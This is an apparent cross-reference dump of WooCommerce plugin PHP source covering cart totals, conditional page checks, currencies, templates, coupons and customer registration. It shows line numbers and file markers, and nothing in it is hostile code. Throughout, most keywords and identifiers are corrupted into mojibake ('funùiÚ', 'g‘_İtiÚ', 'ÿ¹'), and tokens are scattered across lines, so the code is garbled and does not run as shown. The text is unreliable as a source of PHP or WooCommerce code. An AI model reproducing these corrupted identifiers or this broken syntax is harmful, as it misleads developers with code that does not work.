(èè. '" cÏss="woocomm”û-»move-coupÚ">' . 
	`__
( '[Remove]', 'woocommerce' ) . '</a>';

227 
echo
 
	`­¶y_f‹rs
Ğ'woocomm”û_ÿ¹_tÙ®s_coupÚ_html', 
$v®ue
, 
$coupÚ
 );

228 
	}
}

236 
funùiÚ
 
	$wc_ÿ¹_tÙ®s_Üd”_tÙ®_html
() {

237 
echo
 '<¡rÚg>' . 
	`WC
()->
ÿ¹
->
	`g‘_tÙ®
() . '</strong> ';

240 iàĞ
	`g‘_İtiÚ
Ğ'woocomm”û_ÿlc_xes' ) =ğ'yes' && 
	`WC
()->
ÿ¹
->
x_di¥Ïy_ÿ¹
 == 'incl' ) {

241 
$x_¡ršg_¬¿y
 = 
	`¬¿y
();

243 iàĞ
	`g‘_İtiÚ
( 'woocommerce_tax_total_display' ) == 'itemized' ) {

244 
	`fÜ—ch
 ( 
	`WC
()->
ÿ¹
->
	`g‘_x_tÙ®s
(è
as
 
$code
 => 
$x
 )

245 
$x_¡ršg_¬¿y
[] = 
	`¥rštf
Ğ'% %s', 
$x
->
fÜm©‹d_amouÁ
, $x->
Ïb–
 );

247 
$x_¡ršg_¬¿y
[] = 
	`¥rštf
Ğ'% %s', 
	`wc_´iû
Ğ
	`WC
()->
ÿ¹
->
	`g‘_xes_tÙ®
Ğ
Œue
,ruè), WC()->
couÁr›s
->
	`x_Ü_v©
() );

250 iàĞ! 
	`em±y
Ğ
$x_¡ršg_¬¿y
 ) )

251 
echo
 '<sm®Èşass="šşudes_x">' . 
	`¥rštf
Ğ
	`__
Ğ'(Inşude %s)', 'woocomm”û' ), 
	`im¶ode
Ğ', ', 
$x_¡ršg_¬¿y
 ) ) . '</small>';

253 
	}
}

261 
funùiÚ
 
	$wc_ÿ¹_tÙ®s_ãe_html
Ğ
$ãe
 ) {

262 
$ÿ¹_tÙ®s_ãe_html
 = ( 'exş' =ğ
	`WC
()->
ÿ¹
->
x_di¥Ïy_ÿ¹
 ) ? 
	`wc_´iû
Ğ
$ãe
->
amouÁ
 ) : wc_´iûĞ$ãe->amouÁ + $ãe->
x
 );

264 
echo
 
	`­¶y_f‹rs
Ğ'woocomm”û_ÿ¹_tÙ®s_ãe_html', 
$ÿ¹_tÙ®s_ãe_html
, 
$ãe
 );

265 
	}
}

272 
funùiÚ
 
	$wc_ÿ¹_tÙ®s_shpšg_m‘hod_Ïb–
Ğ
$m‘hod
 ) {

273 
$Ïb–
 = 
$m‘hod
->
Ïb–
;

275 iàĞ
$m‘hod
->
co¡
 > 0 ) {

276 iàĞ
	`WC
()->
ÿ¹
->
x_di¥Ïy_ÿ¹
 == 'excl' ) {

277 
$Ïb–
 .ğ': ' . 
	`wc_´iû
Ğ
$m‘hod
->
co¡
 );

278 iàĞ
$m‘hod
->
	`g‘_shpšg_x
(è> 0 && 
	`WC
()->
ÿ¹
->
´iûs_šşude_x
 ) {

279 
$Ïb–
 .ğ' <sm®l>' . 
	`WC
()->
couÁr›s
->
	`ex_x_Ü_v©
() . '</small>';

282 
$Ïb–
 .ğ': ' . 
	`wc_´iû
Ğ
$m‘hod
->
co¡
 + $m‘hod->
	`g‘_shpšg_x
() );

283 iàĞ
$m‘hod
->
	`g‘_shpšg_x
(è> 0 && ! 
	`WC
()->
ÿ¹
->
´iûs_šşude_x
 ) {

284 
$Ïb–
 .ğ' <sm®l>' . 
	`WC
()->
couÁr›s
->
	`šc_x_Ü_v©
() . '</small>';

287 } 
	`–£if
 ( 
$m‘hod
->
id
 !== 'free_shipping' ) {

288 
$Ïb–
 .ğ' (' . 
	`__
( 'Free', 'woocommerce' ) . ')';

291  
	`­¶y_f‹rs
Ğ'woocomm”û_ÿ¹_shpšg_m‘hod_fuÎ_Ïb–', 
$Ïb–
, 
$m‘hod
 );

292 
	}
}

	@includes/wc-conditional-functions.php

1 <?
php


13 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

21 
funùiÚ
 
	$is_woocomm”û
() {

22  
	`­¶y_f‹rs
Ğ'is_woocomm”û', ( 
	`is_shİ
(è|| 
	`is_´oduù_xÚomy
(è|| 
	`is_´oduù
(èè? 
Œue
 : 
çl£
 );

23 
	}
}

25 iàĞ! 
funùiÚ_exi¡s
( 'is_shop' ) ) {

33 
funùiÚ
 
is_shİ
() {

34  ( 
is_po¡_ty³_¬chive
Ğ'´oduù' ) || 
is_·ge
Ğ
wc_g‘_·ge_id
Ğ'shİ' ) ) ) ? 
	gŒue
 : 
çl£
;

38 iàĞ! 
funùiÚ_exi¡s
( 'is_product_taxonomy' ) ) {

46 
funùiÚ
 
is_´oduù_xÚomy
() {

47  
is_x
Ğ
g‘_objeù_xÚom›s
( 'product' ) );

51 iàĞ! 
funùiÚ_exi¡s
( 'is_product_category' ) ) {

60 
funùiÚ
 
is_´oduù_ÿ‹gÜy
Ğ
$‹rm
 = '' ) {

61  
is_x
Ğ'´oduù_ÿt', 
$‹rm
 );

65 iàĞ! 
funùiÚ_exi¡s
( 'is_product_tag' ) ) {

74 
funùiÚ
 
is_´oduù_g
Ğ
$‹rm
 = '' ) {

75  
is_x
Ğ'´oduù_g', 
$‹rm
 );

79 iàĞ! 
funùiÚ_exi¡s
( 'is_product' ) ) {

87 
funùiÚ
 
is_´oduù
() {

88  
is_sšguÏr
Ğ
¬¿y
( 'product' ) );

92 iàĞ! 
funùiÚ_exi¡s
( 'is_cart' ) ) {

100 
funùiÚ
 
is_ÿ¹
() {

101  
is_·ge
Ğ
wc_g‘_·ge_id
( 'cart' ) );

105 iàĞ! 
funùiÚ_exi¡s
( 'is_checkout' ) ) {

113 
funùiÚ
 
is_checkout
() {

114  
is_·ge
Ğ
wc_g‘_·ge_id
Ğ'checkout' ) ) ? 
	gŒue
 : 
çl£
;

118 iàĞ! 
funùiÚ_exi¡s
( 'is_checkout_pay_page' ) ) {

126 
funùiÚ
 
is_checkout_·y_·ge
() {

127 
glob®
 
	g$wp
;

129  
is_checkout
(è&& ! 
em±y
Ğ
$wp
->
qu”y_v¬s
['Üd”-·y'] ) ? 
	gŒue
 : 
çl£
;

133 iàĞ! 
funùiÚ_exi¡s
( 'is_wc_endpoint_url' ) ) {

142 
funùiÚ
 
is_wc_’dpošt_u¾
Ğ
$’dpošt
 ) {

143 
glob®
 
	g$wp
;

145 
	g$wc_’dpošts
 = 
WC
()->
qu”y
->
g‘_qu”y_v¬s
();

147 iàĞ! 
is£t
Ğ
$wc_’dpošts
[ 
$’dpošt
 ] ) ) {

148  
	gçl£
;

150 
	g$’dpošt_v¬
 = 
$wc_’dpošts
[ 
$’dpošt
 ];

153  
is£t
Ğ
$wp
->
qu”y_v¬s
[ 
$’dpošt_v¬
 ] ) ? 
	gŒue
 : 
çl£
;

157 iàĞ! 
funùiÚ_exi¡s
( 'is_account_page' ) ) {

165 
funùiÚ
 
is_accouÁ_·ge
() {

166  
is_·ge
Ğ
wc_g‘_·ge_id
Ğ'myaccouÁ' ) ) || 
­¶y_f‹rs
Ğ'woocomm”û_is_accouÁ_·ge', 
çl£
 ) ? 
	gŒue
 : false;

170 iàĞ! 
funùiÚ_exi¡s
( 'is_order_received_page' ) ) {

178 
funùiÚ
 
is_Üd”_»ûived_·ge
() {

179 
glob®
 
	g$wp
;

181  ( 
is_·ge
Ğ
wc_g‘_·ge_id
Ğ'checkout' ) ) && 
is£t
Ğ
$wp
->
qu”y_v¬s
['Üd”-»ûived'] ) ) ? 
	gŒue
 : 
çl£
;

185 iàĞ! 
funùiÚ_exi¡s
( 'is_add_payment_method_page' ) ) {

193 
funùiÚ
 
is_add_·ym’t_m‘hod_·ge
() {

194 
glob®
 
	g$wp
;

196  ( 
is_·ge
Ğ
wc_g‘_·ge_id
Ğ'myaccouÁ' ) ) && 
is£t
Ğ
$wp
->
qu”y_v¬s
['add-·ym’t-m‘hod'] ) ) ? 
	gŒue
 : 
çl£
;

200 iàĞ! 
funùiÚ_exi¡s
( 'is_ajax' ) ) {

208 
funùiÚ
 
is_ajax
() {

209  
defšed
( 'DOING_AJAX' );

213 iàĞ! 
funùiÚ_exi¡s
( 'is_store_notice_showing' ) ) {

221 
funùiÚ
 
is_¡Üe_nÙiû_showšg
() {

222  
g‘_İtiÚ
Ğ'woocomm”û_demo_¡Üe' ) !=ğ'no' ? 
Œue
 : 
çl£
;

226 iàĞ! 
funùiÚ_exi¡s
( 'is_filtered' ) ) {

234 
funùiÚ
 
is_f‹»d
() {

235 
glob®
 
	g$_cho£n_©Œibu‹s
;

237  
­¶y_f‹rs
Ğ'woocomm”û_is_f‹»d', ( Ğ
$_cho£n_©Œibu‹s
 ) > 0 || ( 
is£t
Ğ
$_GET
['max_price'] ) && isset( $_GET['min_price'] ) ) ) );

241 iàĞ! 
funùiÚ_exi¡s
( 'taxonomy_is_product_attribute' ) ) {

250 
funùiÚ
 
xÚomy_is_´oduù_©Œibu‹
Ğ
$Çme
 ) {

251 
glob®
 
	g$wc_´oduù_©Œibu‹s
;

253  
xÚomy_exi¡s
Ğ
$Çme
 ) && 
¬¿y_key_exi¡s
Ğ$Çme, (
¬¿y
è
$wc_´oduù_©Œibu‹s
 );

257 iàĞ! 
funùiÚ_exi¡s
( 'meta_is_product_attribute' ) ) {

267 
funùiÚ
 
m‘a_is_´oduù_©Œibu‹
Ğ
$Çme
, 
$v®ue
, 
$´oduù_id
 ) {

268 
	g$´oduù
 = 
g‘_´oduù
Ğ
$´oduù_id
 );

270 iàĞ
	g$´oduù
->
	g´oduù_ty³
 != 'variation' ) {

271  
çl£
;

274 
	g$©Œibu‹s
 = 
$´oduù
->
g‘_v¬ŸtiÚ_©Œibu‹s
();

276  ( 
š_¬¿y
Ğ
$Çme
, 
¬¿y_keys
Ğ
$©Œibu‹s
 ) ) && in_¬¿yĞ
$v®ue
, $attributes[ $name ] ) );

	@includes/wc-core-functions.php

1 <?
php


13 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

16 
šşude
( 'wc-cart-functions.php' );

17 
šşude
( 'wc-conditional-functions.php' );

18 
šşude
( 'wc-coupon-functions.php' );

19 
šşude
( 'wc-customer-functions.php' );

20 
šşude
( 'wc-deprecated-functions.php' );

21 
šşude
( 'wc-formatting-functions.php' );

22 
šşude
( 'wc-notice-functions.php' );

23 
šşude
( 'wc-order-functions.php' );

24 
šşude
( 'wc-page-functions.php' );

25 
šşude
( 'wc-product-functions.php' );

26 
šşude
( 'wc-term-functions.php' );

27 
šşude
( 'wc-attribute-functions.php' );

32 
add_f‹r
( 'woocommerce_coupon_code', 'sanitize_text_field' );

33 
add_f‹r
( 'woocommerce_coupon_code', 'strtolower' );

34 
add_f‹r
( 'woocommerce_stock_amount', 'intval' );

39 
add_f‹r
( 'woocommerce_short_description', 'wptexturize' );

40 
add_f‹r
( 'woocommerce_short_description', 'convert_smilies' );

41 
add_f‹r
( 'woocommerce_short_description', 'convert_chars' );

42 
add_f‹r
( 'woocommerce_short_description', 'wpautop' );

43 
add_f‹r
( 'woocommerce_short_description', 'shortcode_unautop' );

44 
add_f‹r
( 'woocommerce_short_description', 'prepend_attachment' );

45 
add_f‹r
( 'woocommerce_short_description', 'do_shortcode', 11 );

55 
funùiÚ
 
wc_g‘_‹m¶©e_·¹
Ğ
$¦ug
, 
$Çme
 = '' ) {

56 
$‹m¶©e
 = '';

59 iàĞ
	g$Çme
 ) {

60 
	g$‹m¶©e
 = 
loÿ‹_‹m¶©e
Ğ
¬¿y
Ğ"{$¦ug}-{$Çme}.php", 
WC
()->
‹m¶©e_·th
() . "{$slug}-{$name}.php" ) );

64 iàĞ! 
	g$‹m¶©e
 && 
	g$Çme
 && 
fe_exi¡s
Ğ
WC
()->
¶ugš_·th
() . "/templates/{$slug}-{$name}.php" ) ) {

65 
	g$‹m¶©e
 = 
WC
()->
¶ugš_·th
() . "/templates/{$slug}-{$name}.php";

69 iàĞ! 
	g$‹m¶©e
 ) {

70 
	g$‹m¶©e
 = 
loÿ‹_‹m¶©e
Ğ
¬¿y
Ğ"{$¦ug}.php", 
WC
()->
‹m¶©e_·th
() . "{$slug}.php" ) );

74 
	g$‹m¶©e
 = 
­¶y_f‹rs
Ğ'wc_g‘_‹m¶©e_·¹', 
$‹m¶©e
, 
$¦ug
, 
$Çme
 );

76 iàĞ
	g$‹m¶©e
 ) {

77 
lßd_‹m¶©e
Ğ
$‹m¶©e
, 
çl£
 );

91 
funùiÚ
 
wc_g‘_‹m¶©e
Ğ
$‹m¶©e_Çme
, 
$¬gs
 = 
¬¿y
(), 
$‹m¶©e_·th
 = '', 
$deçuÉ_·th
 = '' ) {

92 iàĞ
$¬gs
 && 
is_¬¿y
( $args ) ) {

93 
exŒaù
Ğ
$¬gs
 );

96 
	g$loÿ‹d
 = 
wc_loÿ‹_‹m¶©e
Ğ
$‹m¶©e_Çme
, 
$‹m¶©e_·th
, 
$deçuÉ_·th
 );

98 iàĞ! 
fe_exi¡s
Ğ
$loÿ‹d
 ) ) {

99 
_došg_™_wrÚg
Ğ
__FUNCTION__
, 
¥rštf
Ğ'<code>%s</code> dÛ nÙƒxi¡.', 
$loÿ‹d
 ), '2.1' );

103 
do_aùiÚ
Ğ'woocomm”û_befÜe_‹m¶©e_·¹', 
$‹m¶©e_Çme
, 
$‹m¶©e_·th
, 
$loÿ‹d
, 
$¬gs
 );

105 
šşude
Ğ
$loÿ‹d
 );

107 
do_aùiÚ
Ğ'woocomm”û_aá”_‹m¶©e_·¹', 
$‹m¶©e_Çme
, 
$‹m¶©e_·th
, 
$loÿ‹d
, 
$¬gs
 );

125 
funùiÚ
 
wc_loÿ‹_‹m¶©e
Ğ
$‹m¶©e_Çme
, 
$‹m¶©e_·th
 = '', 
$deçuÉ_·th
 = '' ) {

126 iàĞ! 
$‹m¶©e_·th
 ) {

127 
$‹m¶©e_·th
 = 
WC
()->
‹m¶©e_·th
();

130 iàĞ! 
	g$deçuÉ_·th
 ) {

131 
	g$deçuÉ_·th
 = 
WC
()->
¶ugš_·th
() . '/templates/';

135 
	g$‹m¶©e
 = 
loÿ‹_‹m¶©e
(

136 
¬¿y
(

137 
Œašg¦ash™
Ğ
$‹m¶©e_·th
 ) . 
$‹m¶©e_Çme
,

138 
$‹m¶©e_Çme


143 iàĞ! 
	g$‹m¶©e
 ) {

144 
	g$‹m¶©e
 = 
$deçuÉ_·th
 . 
$‹m¶©e_Çme
;

148  
­¶y_f‹rs
('woocomm”û_loÿ‹_‹m¶©e', 
$‹m¶©e
, 
$‹m¶©e_Çme
, 
$‹m¶©e_·th
);

155 
funùiÚ
 
	$g‘_woocomm”û_cu¼’cy
() {

156  
	`­¶y_f‹rs
Ğ'woocomm”û_cu¼’cy', 
	`g‘_İtiÚ
('woocommerce_currency') );

157 
	}
}

163 
funùiÚ
 
	$g‘_woocomm”û_cu¼’c›s
() {

164  
	`¬¿y_unique
(

165 
	`­¶y_f‹rs
( 'woocommerce_currencies',

166 
	`¬¿y
(

167 'AED' => 
	`__
( 'United Arab Emirates Dirham', 'woocommerce' ),

168 'AUD' => 
	`__
( 'Australian Dollars', 'woocommerce' ),

169 'BDT' => 
	`__
( 'Bangladeshi Taka', 'woocommerce' ),

170 'BRL' => 
	`__
( 'Brazilian Real', 'woocommerce' ),

171 'BGN' => 
	`__
( 'Bulgarian Lev', 'woocommerce' ),

172 'CAD' => 
	`__
( 'Canadian Dollars', 'woocommerce' ),

173 'CLP' => 
	`__
( 'Chilean Peso', 'woocommerce' ),

174 'CNY' => 
	`__
( 'Chinese Yuan', 'woocommerce' ),

175 'COP' => 
	`__
( 'Colombian Peso', 'woocommerce' ),

176 'CZK' => 
	`__
( 'Czech Koruna', 'woocommerce' ),

177 'DKK' => 
	`__
( 'Danish Krone', 'woocommerce' ),

178 'EUR' => 
	`__
( 'Euros', 'woocommerce' ),

179 'HKD' => 
	`__
( 'Hong Kong Dollar', 'woocommerce' ),

180 'HRK' => 
	`__
( 'Croatia kuna', 'woocommerce' ),

181 'HUF' => 
	`__
( 'Hungarian Forint', 'woocommerce' ),

182 'ISK' => 
	`__
( 'Icelandic krona', 'woocommerce' ),

183 'IDR' => 
	`__
( 'Indonesia Rupiah', 'woocommerce' ),

184 'INR' => 
	`__
( 'Indian Rupee', 'woocommerce' ),

185 'ILS' => 
	`__
( 'Israeli Shekel', 'woocommerce' ),

186 'JPY' => 
	`__
( 'Japanese Yen', 'woocommerce' ),

187 'KRW' => 
	`__
( 'South Korean Won', 'woocommerce' ),

188 'MYR' => 
	`__
( 'Malaysian Ringgits', 'woocommerce' ),

189 'MXN' => 
	`__
( 'Mexican Peso', 'woocommerce' ),

190 'NGN' => 
	`__
( 'Nigerian Naira', 'woocommerce' ),

191 'NOK' => 
	`__
( 'Norwegian Krone', 'woocommerce' ),

192 'NZD' => 
	`__
( 'New Zealand Dollar', 'woocommerce' ),

193 'PHP' => 
	`__
( 'Philippine Pesos', 'woocommerce' ),

194 'PLN' => 
	`__
( 'Polish Zloty', 'woocommerce' ),

195 'GBP' => 
	`__
( 'Pounds Sterling', 'woocommerce' ),

196 'RON' => 
	`__
( 'Romanian Leu', 'woocommerce' ),

197 'RUB' => 
	`__
( 'Russian Ruble', 'woocommerce' ),

198 'SGD' => 
	`__
( 'Singapore Dollar', 'woocommerce' ),

199 'ZAR' => 
	`__
( 'South African„and', 'woocommerce' ),

200 'SEK' => 
	`__
( 'Swedish Krona', 'woocommerce' ),

201 'CHF' => 
	`__
( 'Swiss Franc', 'woocommerce' ),

202 'TWD' => 
	`__
( 'Taiwan New Dollars', 'woocommerce' ),

203 'THB' => 
	`__
( 'Thai Baht', 'woocommerce' ),

204 'TRY' => 
	`__
( 'Turkish Lira', 'woocommerce' ),

205 'USD' => 
	`__
( 'US Dollars', 'woocommerce' ),

206 'VND' => 
	`__
( 'Vietnamese Dong', 'woocommerce' ),

210 
	}
}

217 
funùiÚ
 
g‘_woocomm”û_cu¼’cy_symbŞ
Ğ
$cu¼’cy
 = '' ) {

218 iàĞ! 
$cu¼’cy
 ) {

219 
$cu¼’cy
 = 
g‘_woocomm”û_cu¼’cy
();

222  
	g$cu¼’cy
 ) {

224 
$cu¼’cy_symbŞ
 = 'Ø¯.Ø¥';

227 
$cu¼’cy_symbŞ
 = '&#2547;&nbsp;';

230 
$cu¼’cy_symbŞ
 = '&#82;&#36;';

233 
$cu¼’cy_symbŞ
 = '&#1083;&#1074;.';

243 
$cu¼’cy_symbŞ
 = '&#36;';

246 
$cu¼’cy_symbŞ
 = '&euro;';

251 
$cu¼’cy_symbŞ
 = '&yen;';

254 
$cu¼’cy_symbŞ
 = '&#1088;&#1091;&#1073;.';

256 'KRW' : 
$cu¼’cy_symbŞ
 = '&#8361;'; ;

257 'TRY' : 
$cu¼’cy_symbŞ
 = '&#84;&#76;'; ;

258 'NOK' : 
$cu¼’cy_symbŞ
 = '&#107;&#114;'; ;

259 'ZAR' : 
$cu¼’cy_symbŞ
 = '&#82;'; ;

260 'CZK' : 
$cu¼’cy_symbŞ
 = '&#75;&#269;'; ;

261 'MYR' : 
$cu¼’cy_symbŞ
 = '&#82;&#77;'; ;

262 'DKK' : 
$cu¼’cy_symbŞ
 = '&#107;&#114;'; ;

263 'HUF' : 
$cu¼’cy_symbŞ
 = '&#70;&#116;'; ;

264 'IDR' : 
$cu¼’cy_symbŞ
 = 'Rp'; ;

265 'INR' : 
$cu¼’cy_symbŞ
 = 'Rs.'; ;

266 'ISK' : 
$cu¼’cy_symbŞ
 = 'Kr.'; ;

267 'ILS' : 
$cu¼’cy_symbŞ
 = '&#8362;'; ;

268 'PHP' : 
$cu¼’cy_symbŞ
 = '&#8369;'; ;

269 'PLN' : 
$cu¼’cy_symbŞ
 = '&#122;&#322;'; ;

270 'SEK' : 
$cu¼’cy_symbŞ
 = '&#107;&#114;'; ;

271 'CHF' : 
$cu¼’cy_symbŞ
 = '&#67;&#72;&#70;'; ;

272 'TWD' : 
$cu¼’cy_symbŞ
 = '&#78;&#84;&#36;'; ;

273 'THB' : 
$cu¼’cy_symbŞ
 = '&#3647;'; ;

274 'GBP' : 
$cu¼’cy_symbŞ
 = '&pound;'; ;

275 'RON' : 
$cu¼’cy_symbŞ
 = 'lei'; ;

276 'VND' : 
$cu¼’cy_symbŞ
 = '&#8363;'; ;

277 'NGN' : 
$cu¼’cy_symbŞ
 = '&#8358;'; ;

278 'HRK' : 
$cu¼’cy_symbŞ
 = 'Kn'; ;

279  : 
$cu¼’cy_symbŞ
 = ''; ;

282  
­¶y_f‹rs
Ğ'woocomm”û_cu¼’cy_symbŞ', 
$cu¼’cy_symbŞ
, 
$cu¼’cy
 );

294 
funùiÚ
 
wc_ma
Ğ
$to
, 
$subjeù
, 
$mes§ge
, 
$h—d”s
 = "CÚ‹Á-Ty³:ext/html\r\n", 
$©chm’ts
 = "" ) {

295 
glob®
 
$woocomm”û
;

297 
	g$ma”
 = 
WC
()->
ma”
();

299 
	g$ma”
->
£nd
Ğ
$to
, 
$subjeù
, 
$mes§ge
, 
$h—d”s
, 
$©chm’ts
 );

310 
funùiÚ
 
	$wc_g‘_image_size
Ğ
$image_size
 ) {

311 iàĞ
	`š_¬¿y
Ğ
$image_size
, 
	`¬¿y
( 'shop_thumbnail', 'shop_catalog', 'shop_single' ) ) ) {

312 
$size
 = 
	`g‘_İtiÚ
Ğ
$image_size
 . '_image_size', 
	`¬¿y
() );

313 
$size
['width'] = 
	`is£t
( $size['width'] ) ? $size['width'] : '300';

314 
$size
['height'] = 
	`is£t
( $size['height'] ) ? $size['height'] : '300';

315 
$size
['üİ'] = 
	`is£t
( $size['crop'] ) ? $size['crop'] : 1;

317 
$size
 = 
	`¬¿y
(

324  
	`­¶y_f‹rs
Ğ'woocomm”û_g‘_image_size_' . 
$image_size
, 
$size
 );

325 
	}
}

332 
funùiÚ
 
	$wc_’queue_js
Ğ
$code
 ) {

333 
glob®
 
$wc_queued_js
;

335 iàĞ
	`em±y
Ğ
$wc_queued_js
 ) ) {

336 
$wc_queued_js
 = '';

339 
$wc_queued_js
 .ğ"\n" . 
$code
 . "\n";

340 
	}
}

345 
funùiÚ
 
	$wc_´št_js
() {

346 
glob®
 
$wc_queued_js
;

348 iàĞ! 
	`em±y
Ğ
$wc_queued_js
 ) ) {

350 
echo
 "<!-- WooCommerce JavaScript -->\n<scriptype=\"text/javascript\">\njQuery(function($) {";

353 
$wc_queued_js
 = 
	`wp_check_šv®id_utf8
( $wc_queued_js );

354 
$wc_queued_js
 = 
	`´eg_»¶aû
( '/&#(x)?0*(?(1)27|39);?/i', "'", $wc_queued_js );

355 
$wc_queued_js
 = 
	`¡r_»¶aû
( "\r", '', $wc_queued_js );

357 
echo
 
$wc_queued_js
 . "});\n</script>\n";

359 
	`un£t
Ğ
$wc_queued_js
 );

361 
	}
}

371 
funùiÚ
 
	$wc_£tcook›
Ğ
$Çme
, 
$v®ue
, 
$expœe
 = 0, 
$£cu»
 = 
çl£
 ) {

372 iàĞ! 
	`h—d”s_£Á
() ) {

373 
	`£tcook›
Ğ
$Çme
, 
$v®ue
, 
$expœe
, 
COOKIEPATH
, 
COOKIE_DOMAIN
, 
$£cu»
 );

374 } 
	`–£if
 ( 
	`defšed
Ğ'WP_DEBUG' ) && 
WP_DEBUG
 ) {

375 
	`Œigg”_”rÜ
Ğ"Cook› cªnÙ b£ˆ- h—d” ®»ady s’t", 
E_USER_NOTICE
 );

377 
	}
}

386 
funùiÚ
 
	$g‘_woocomm”û_­i_u¾
Ğ
$·th
 ) {

388 
$u¾
 = 
	`g‘_home_u¾
Ğ
nuÎ
, 'wc-­i/v' . 
WC_API
::
VERSION
 . '/', 
	`is_s¦
() ? 'https' : 'http' );

390 iàĞ! 
	`em±y
Ğ
$·th
 ) && 
	`is_¡ršg
( $path ) ) {

391 
$u¾
 .ğ
	`Érim
Ğ
$·th
, '/' );

394  
$u¾
;

395 
	}
}

	@includes/wc-coupon-functions.php

1 <?
php


13 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

20 
funùiÚ
 
	$wc_g‘_coupÚ_ty³s
() {

21  (
¬¿y
è
	`­¶y_f‹rs
Ğ'woocomm”û_coupÚ_discouÁ_ty³s', 
	`¬¿y
(

22 'fixed_ÿ¹' => 
	`__
( 'Cart Discount', 'woocommerce' ),

23 '³rûÁ' => 
	`__
( 'Cart % Discount', 'woocommerce' ),

24 'fixed_´oduù' => 
	`__
( 'Product Discount', 'woocommerce' ),

25 '³rûÁ_´oduù' => 
	`__
( 'Product % Discount', 'woocommerce' )

27 
	}
}

35 
funùiÚ
 
wc_g‘_coupÚ_ty³
Ğ
$ty³
 = '' ) {

36 
$ty³s
 = 
wc_g‘_coupÚ_ty³s
();

37 iàĞ
is£t
Ğ
$ty³s
[ 
$ty³
 ] ) )

38  
	g$ty³s
[ 
$ty³
 ];

	@includes/wc-customer-functions.php

1 <?
php


13 iàĞ! 
defšed
( 'ABSPATH' ) ) {

14 
	gex™
;

26 
funùiÚ
 
	$wc_di§bË_admš_b¬
Ğ
$show_admš_b¬
 ) {

27 iàĞ
	`­¶y_f‹rs
Ğ'woocomm”û_di§bË_admš_b¬', 
	`g‘_İtiÚ
Ğ'woocomm”û_lock_down_admš', 'yes' ) ==ğ'yes' ) && ! ( 
	`cu¼’t_u£r_ÿn
( 'edit_posts' ) || current_user_can( 'manage_woocommerce' ) ) ) {

28 
$show_admš_b¬
 = 
çl£
;

31  
$show_admš_b¬
;

32 
	}
}

33 
add_f‹r
( 'show_admin_bar', 'wc_disable_admin_bar', 10, 1 );

44 
funùiÚ
 
wc_ü—‹_Ãw_cu¡om”
Ğ
$ema
, 
$u£ºame
 = '', 
$·sswÜd
 = '' ) {

47 iàĞ
em±y
Ğ
$ema
 ) || ! 
is_ema
( $email ) ) {

48  
Ãw
 
WP_E¼Ü
Ğ'»gi¡¿tiÚ-”rÜ', 
__
( 'Please…rovide‡ validƒmail‡ddress.', 'woocommerce' ) );

51 iàĞ
ema_exi¡s
Ğ
$ema
 ) ) {

52  
Ãw
 
WP_E¼Ü
Ğ'»gi¡¿tiÚ-”rÜ', 
__
( 'An‡ccount is‡lready„egistered with yourƒmail‡ddress. Please†ogin.', 'woocommerce' ) );

56 iàĞ'no' ==ğ
g‘_İtiÚ
Ğ'woocomm”û_»gi¡¿tiÚ_g’”©e_u£ºame' ) || ! 
em±y
Ğ
$u£ºame
 ) ) {

58 
$u£ºame
 = 
§n™ize_u£r
( $username );

60 iàĞ
em±y
Ğ
$u£ºame
 ) || ! 
v®id©e_u£ºame
( $username ) ) {

61  
Ãw
 
WP_E¼Ü
Ğ'»gi¡¿tiÚ-”rÜ', 
__
( 'Pleaseƒnter‡ valid‡ccount username.', 'woocommerce' ) );

64 iàĞ
u£ºame_exi¡s
Ğ
$u£ºame
 ) )

65  
Ãw
 
WP_E¼Ü
Ğ'»gi¡¿tiÚ-”rÜ', 
__
( 'An‡ccount is‡lready„egistered withhat username. Please choose‡nother.', 'woocommerce' ) );

68 
	g$u£ºame
 = 
§n™ize_u£r
Ğ
cu¼’t
Ğ
ex¶ode
Ğ'@', 
$ema
 ) ) );

71 
	g$­³nd
 = 1;

72 
	g$o_u£ºame
 = 
$u£ºame
;

74  
u£ºame_exi¡s
Ğ
$u£ºame
 ) ) {

75 
	g$u£ºame
 = 
$o_u£ºame
 . 
$­³nd
;

76 
	g$­³nd
 ++;

81 iàĞ'yes' ==ğ
g‘_İtiÚ
Ğ'woocomm”û_»gi¡¿tiÚ_g’”©e_·sswÜd' ) && 
em±y
Ğ
$·sswÜd
 ) ) {

82 
$·sswÜd
 = 
wp_g’”©e_·sswÜd
();

83 
	g$·sswÜd_g’”©ed
 = 
Œue
;

85 } 
–£if
 ( 
em±y
Ğ
$·sswÜd
 ) ) {

86  
Ãw
 
WP_E¼Ü
Ğ'»gi¡¿tiÚ-”rÜ', 
__
( 'Pleaseƒnter‡n‡ccount…assword.', 'woocommerce' ) );

89 
	g$·sswÜd_g’”©ed
 = 
çl£
;

93 
	g$v®id©iÚ_”rÜs
 = 
Ãw
 
WP_E¼Ü
();

95 
do_aùiÚ
Ğ'woocomm”û_»gi¡”_po¡', 
$u£ºame
, 
$ema
, 
$v®id©iÚ_”rÜs
 );

97 
	g$v®id©iÚ_”rÜs
 = 
­¶y_f‹rs
Ğ'woocomm”û_»gi¡¿tiÚ_”rÜs', 
$v®id©iÚ_”rÜs
, 
$u£ºame
, 
$ema
 );

99 iàĞ
	g$v®id©iÚ_”rÜs
->
g‘_”rÜ_code
() )

100  
	g$v®id©iÚ_”rÜs
;

102 
	g$Ãw_cu¡om”_d©a
 = 
­¶y_f‹rs
Ğ'woocomm”û_Ãw_cu¡om”_d©a', 
¬¿y
(

103 'u£r_logš' => 
$u£ºame
,

104 'u£r_·ss' => 
$·sswÜd
,

105 'u£r_ema' => 
$ema
,

109 
	g$cu¡om”_id
 = 
wp_š£¹_u£r
Ğ
$Ãw_cu¡om”_d©a
 );

111 iàĞ
is_wp_”rÜ
Ğ
$cu¡om”_id
 ) ) {

112  
Ãw
 
WP_E¼Ü
Ğ'»gi¡¿tiÚ-”rÜ', '<¡rÚg>' . 
__
( 'ERROR', 'woocommerce' ) . '</strong>: ' . __( 'Couldn&#8217;t„egister you&hellip;…lease contact us if you continueo have…roblems.', 'woocommerce' ) );

115 
do_aùiÚ
Ğ'woocomm”û_ü—‹d_cu¡om”', 
$cu¡om”_id
, 
$Ãw_cu¡om”_d©a
, 
$·sswÜd_g’”©ed
 );

117  
	g$cu¡om”_id
;

126 
funùiÚ
 
	$wc_£t_cu¡om”_auth_cook›
Ğ
$cu¡om”_id
 ) {

127 
glob®
 
$cu¼’t_u£r
;

129 
$cu¼’t_u£r
 = 
	`g‘_u£r_by
Ğ'id', 
